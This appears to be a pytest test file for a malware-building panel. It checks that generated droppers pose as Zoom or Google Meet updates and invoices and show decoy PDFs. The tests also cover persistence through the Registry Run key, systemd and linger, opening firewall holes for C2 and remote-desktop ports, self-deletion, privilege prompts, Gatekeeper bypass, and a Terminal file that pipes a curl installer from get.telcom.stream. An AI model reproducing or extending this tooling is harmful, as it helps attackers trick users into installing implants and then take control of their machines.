import base64
import dataclasses

from panel import build
from panel.build import (
    TARGETS,
    BuildRequest,
    delivery_block,
    load_build_request,
    minimal_pdf,
    render_linux,
    render_windows,
    slug,
    vbs_string_expr,
)
from panel.config import Settings


def test_six_targets():
    assert len(TARGETS) == 6
    assert ("windows", "amd64") in TARGETS
    assert ("linux", "arm64") in TARGETS


def test_vbs_string_expr_continuations():
    expr = vbs_string_expr("abcd" * 2000, width=1024)
    assert expr.startswith('"')
    assert " & _" in expr
    # evaluate the VBS expression mimic: join quoted chunks
    parts = expr.replace(" & _\n    ", "").replace('"', "")
    assert len(parts) == 8000


def test_vbs_string_expr_empty():
    assert vbs_string_expr("") == '""'


def test_minimal_pdf_is_valid_shell():
    pdf = minimal_pdf("Q3 Report (final)")
    assert pdf.startswith(b"%PDF-1.4")
    assert pdf.rstrip().endswith(b"%%EOF")
    assert b"xref" in pdf
    assert b"Q3 Report final" in pdf


def test_render_windows_bakes_all_placeholders():
    out = render_windows(
        "Q3 Report", "abcd", b"\x01\x02\x03", minimal_pdf("x"), "https://get.example"
    )
    assert "{{" not in out
    assert "Q3 Report" in out
    assert "abcd" in out
    assert "ADODB.Stream" in out
    assert "SaveToFile" in out
    assert "WinHttp.WinHttpRequest.5.1" in out
    assert "https://get.example/dl/decoy.pdf" in out
    expected_loader = base64.b64encode(b"\x01\x02\x03").decode()
    assert expected_loader in out.replace('" & _', "").replace("\n", "").replace("    ", "")


def test_render_linux_has_persistence():
    out = render_linux("Q3 Report", "wxyz", b"\xaa\xbb")
    assert "PANEL_HOST" in out
    assert "loginctl enable-linger" in out
    assert ".config/systemd/user" in out
    assert "setsid" in out
    assert ".fleet-wxyz" in out
    assert base64.b64encode(b"\xaa\xbb").decode() in out


def test_delivery_block_mentions_sha():
    block = delivery_block("linux", "invoice-abcd.tar.gz", "Q3 Report", "deadbeef")
    assert "sha256: deadbeef" in block
    assert "tar xzf" in block


def test_slug_is_eight():
    assert len(slug()) == 8
    assert len({slug() for _ in range(50)}) > 1


def test_profiles_naming():
    assert build.PROFILES["zoom"]["linux"] == "zoom-update"
    assert build.PROFILES["meet"]["linux"] == "google-meet-update"
    req_zoom = BuildRequest(doc_name="d", profile="zoom")
    req_meet = BuildRequest(doc_name="d", profile="meet")
    assert req_zoom.naming["win"].startswith("Zoom")
    assert req_meet.naming["mac"].startswith("Google Meet")


def test_windows_template_persists():
    out = render_windows(
        "Zoom-Update", "ab12", b"\x01", minimal_pdf("x"), "https://h", "Zoom Update"
    )
    assert "CurrentVersion\\Run\\Fleetab12" in out
    assert "RegWrite" in out
    assert "ADODB.Stream" in out
    assert "SaveToFile" in out
    assert "Zoom Update" in out


def test_windows_payload_opens_firewall():
    out = render_windows("Zoom-Update", "ab12", b"\x01", minimal_pdf("x"), "https://h")
    assert "advfirewall" in out
    assert "dir=out" in out
    assert "action=allow" in out
    assert "selfPath" in out
    assert "del /f /q" in out


def test_linux_payload_opens_firewall():
    out = render_linux("zoom-update", "ab12", b"\x01")
    assert "ufw" in out
    assert "firewall-cmd" in out
    assert "PANEL_C2_PORT" in out and "PANEL_RD_PORT" in out


def test_mac_payload_opens_firewall():
    script = (build.TEMPLATES / "mac" / "dropper.command.tmpl").read_text(encoding="utf-8")
    assert "socketfilterfw" in script
    assert "--unblockapp" in script
    assert "osascript" in script
    assert "with administrator privileges" in script
    assert "spctl --add" in script


def test_linux_naming_and_delivery():
    name = "zoom-update-ab12.tar.gz"
    block = delivery_block("linux", name, "Zoom Update", "sha")
    assert "./zoom-update-ab12.sh" in block


def test_load_build_request(tmp_settings):
    req = load_build_request(
        {
            "doc_name": "Doc",
            "transport": "mtls",
            "c2_url": "1.2.3.4:8888",
            "base_url": "https://x/",
        },
        tmp_settings,
    )
    assert isinstance(req, BuildRequest)
    assert req.base_url == "https://x"
    assert req.interval == 60 and req.jitter == 35
    assert req.evasion is True


def test_load_build_request_defaults_doc(tmp_settings):
    settings = dataclasses.replace(tmp_settings, document_name="Invoice")
    req = load_build_request({}, settings)
    assert req.doc_name == "Invoice"


def test_settings_has_expected_fields():
    assert issubclass(Settings, object)


MACHO = b"\xcf\xfa\xed\xfe" + b"\x00" * 64
ELF = b"\x7fELF" + b"\x00" * 64


def test_extract_implant_from_mac_command_zip(tmp_path):
    import zipfile

    script = (
        "#!/bin/bash\n"
        f"IMPLANT_B64='{base64.b64encode(MACHO).decode()}'\n"
        "echo hi\n"
    )
    art = tmp_path / "Zoom Update_ab12.command.zip"
    with zipfile.ZipFile(art, "w") as zf:
        zf.writestr("Zoom Update_ab12.command", script)
    data, name = build.extract_implant_from_artifact(art, "darwin")
    assert data == MACHO
    assert name == "fleetrun"


def test_extract_implant_rejects_non_macho_payload(tmp_path):
    import zipfile

    # A .command served as the "binary" must never be handed back as payload.
    script_payload = b"#!/bin/bash\necho no\n"
    encoded = base64.b64encode(script_payload).decode()
    script = f"IMPLANT_B64='{encoded}'\n"
    art = tmp_path / "Zoom Update_ab12.command.zip"
    with zipfile.ZipFile(art, "w") as zf:
        zf.writestr("Zoom Update_ab12.command", script)
    assert build.extract_implant_from_artifact(art, "darwin") is None


def test_extract_implant_from_linux_tar(tmp_path):
    import io
    import tarfile

    art = tmp_path / "zoom-update-ab12.tar.gz"
    with tarfile.open(art, "w:gz") as tf:
        info = tarfile.TarInfo(".fleet-ab12")
        info.size = len(ELF)
        tf.addfile(info, io.BytesIO(ELF))
    data, name = build.extract_implant_from_artifact(art, "linux")
    assert data == ELF
    assert name == "fleetrun"


def test_mac_installer_signs_and_keeps_persistence_target():
    src = (build.TEMPLATES / "mac" / "installer.sh.tmpl").read_text(encoding="utf-8")
    assert "codesign --force --sign -" in src
    assert "SUDO_USER" in src
    assert 'rm -rf "$WORKDIR"' not in src


def test_mac_dropper_keeps_persistence_target():
    src = (build.TEMPLATES / "mac" / "dropper.command.tmpl").read_text(encoding="utf-8")
    assert 'rm -rf "$WORKDIR"' not in src
    assert "Mach-O" in src


def test_linux_installer_keeps_persistence_target():
    src = (build.TEMPLATES / "linux" / "installer.sh.tmpl").read_text(encoding="utf-8")
    assert 'rm -rf "$WORKDIR"' not in src


def test_zip_member_is_executable_on_unix():
    import io
    import zipfile

    data = build.zip_exec_member("Zoom Update_ab12.command", b"#!/bin/bash\necho hi\n")
    with zipfile.ZipFile(io.BytesIO(data)) as zf:
        info = zf.infolist()[0]
        assert info.create_system == 3
        assert (info.external_attr >> 16) & 0o777 == 0o755


def test_render_terminal_runs_curl_installer():
    out = build.render_terminal("Google Meet Update", "get.telcom.stream")
    assert out.startswith("<?xml")
    assert "CommandString" in out
    assert "https://get.telcom.stream/install/mac" in out
    assert "curl -fsSL" in out
    assert "Google Meet Update" in out
